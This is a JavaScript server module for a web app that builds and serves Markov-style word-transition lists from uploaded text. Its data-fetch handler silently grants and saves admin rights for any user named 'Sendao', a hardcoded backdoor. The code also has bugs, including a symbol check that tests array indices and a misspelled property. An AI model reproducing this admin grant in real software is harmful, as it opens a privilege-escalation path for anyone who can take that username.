module.exports = function MarkySinglet(myapp) {
  var cc = this;
  var app = myapp;
  var db = app.db;
  var dbase = app.dbase;
  this.app = app;

  this.allow_access = true;

  this.Data = function() {
    db.control.call(this, 'marky');

    this.Lists = function() {
        this.name = 'lists';
        this.loadoll = true;
        this.primary = "id";
        this.indice = { 'id': {} };
        this.defaults = { 'name': '', 'owner': '', 'private': false };
        dbase.call(this, app, 'marky');
    };
    this.lists = new this.Lists();

    app.record_db=true;

    this.Words = function() {
        this.name = 'words';
        this.loadall = true;
        this.primary = "id";
        this.indice = { 'listid': {}, "id": {} };
        this.defaults = { 'listid': 0, 'word': '', 'nexts': '' };
        dbase.call(this, app, 'marky');
    };
    this.words = new this.Words();

    app.record_db=false;
  };

  this.routes = function(router) {
    router.get('/marky/data').bind(this.getData.bind(this));
    router.post('/marky/upload').bind(this.addData.bind(this));
  };

  this.tokenize = function( text )
  {
    var i, len;
    var words = [];
    var fairsyms = ['_', '@', '%', '$', '-', '+', '=', "'"];
    var wordbuf="", c;
    len = text.length;
    for( i = 0; i < len; ++i ) {
        c = text[i];
        if( this.app.util.isAlpha(c) || this.app.util.isDigit(c) || c in fairsyms ) {
            wordbuf += c;
        } else {
            if( wordbuf.length > 0 ) {
                words.push(wordbuf.toLowerCase());
            }
            wordbuf="";
        }
    }
    if( wordbuf.length > 0 ) {
        words.push(wordbuf.toLowerCase());
    }
    return words;
  };

  this.formatMarky = function( text )
  {
    var words = this.tokenize( text )
    var nexts = {};
    var len = words.length;
    var l = null;
    var i, c;
    for( i = 0; i+1 < len; ++i ) {
        c = words[i];
        l = words[i+1];
        if( !(c in nexts) ) {
            nexts[c] = {};
        }
        if( !(l in nexts) ) {
          nexts[l] = {};
        }
        if( !(l in nexts[c]) ) {
            nexts[c][l] = 0;
        }
        ++nexts[c][l];
    }

    return nexts;
  };

  this.postMarky = function( name, text, isprivate, userid )
  {
    var nexts = this.formatMarky(text);

    // create the markup listing.
    var xd = this.base.lists;
    var list = xd.create({'name': name, 'owner': userid, 'private': isprivate });
    xd.save(list);

    xd = this.base.words;

    // store the nexts.
    var o, x;
    var i, j;
    console.log("Starting word prep");
    for( i in nexts ) {
        x = "";
        for( j in nexts[i] ) {
            if( x != "" ) x += ";";
            x += j + ";" + nexts[i][j];
        }
        o = xd.create({'listid': list.id, 'word': i, 'nexts':x});
        xd.saveBack(o);
    }
    console.log("Finished preparing words");
    xd.finishSaves();
    console.log("Finished saving");

    return true;
  };

  this.getData = function(req, res, params) {
    var sess = this.app.authSession(req, res, params);
    var i, j;

    var lists = this.base.lists.fetchAll();
    var names, cx = {}, cv, cd;
    var zxt, t, m=0, cd;
    var data;
    if( sess === false ) {
      sess = { permissions: ['guest'], userid: false, user: { name: 'Guest' } };
    }

    if( sess.user && sess.user.name == "Sendao" ) {
      if( sess.permissions.indexOf("admin") < 0 )
        sess.permissions.push("admin");
      if( sess.user.permissions.indexOf("admin") < 0 )
        sess.user.permissions.push("admin");
      else {
        sess.user.permissions = [...new Set(sess.user.permissions)];
      }
      this.app.base.sess.sessions.save( sess );
      this.app.base.sess.users.save( sess.user );
    }

      //console.log(sess, lists);
    for( i=0; i<lists.length; i++ ) {
      if( lists[i].private && lists[i].owner != sess.userid && sess.permissions.indexOf("admin")<0 ) {
        console.log("Permission denied to ", lists[i], " for ", sess);
        continue;
      }
      names = this.tokenize( lists[i].name );
      cv=[];
      for( j=0; j<names.length; ++j ) {
        if( cv.indexOf(names[j]) != -1 ) continue;
        cv.push( names[j] );
      }

      data = this.base.words.searchIn( { listid: lists[i].id } );
      if( !data ) {
        console.log("Empty list: ", lists[i]);
        continue;
      }
      //console.log("Loaded records ", data);

      cx[ lists[i].id ] = { 'name': lists[i].name, 'w': cv };
      //console.log("Read data: ", data);
      cd = {};

      for( j=0; j<data.length; ++j ) {
        zxt = data[j].nexts.split(";");
        t=0;
        for( var k=0; k<zxt.length; k+=2 ) {
          t += parseInt(zxt[k+1]);
        }
        cd[ data[j].word ] = { 'w': data[j].word, 's': zxt, 't': t };
      }

      cx[ lists[i].id ].words = cd;
    }
    //console.log("Send off: ", cx);

    this.app.respond.jsonOk(res, cx);
  };

  this.addData = function(req, res, params) {
    var sess = this.app.requireAuth(req, res, params);
    if( !sess ) return;

    this.postMarky( params['name'], params['text'], params['private']==1, sess.userid );

    this.app.respond.jsonOk(res);
  };

};
